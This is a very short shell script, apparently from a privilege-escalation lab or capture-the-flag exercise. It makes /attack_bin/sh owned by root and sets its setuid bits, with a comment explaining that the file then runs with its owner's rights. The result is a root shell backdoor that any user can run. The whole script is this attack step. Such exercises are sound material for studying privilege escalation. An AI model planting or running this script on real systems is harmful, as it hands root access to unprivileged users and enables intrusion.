#!/bin/sh

chown root:root /attack_bin/sh
#chmod a+s: a:all users, +s:If someone else runs the file, they will run the file as the user/group who created it.
chmod a+s /attack_bin/sh

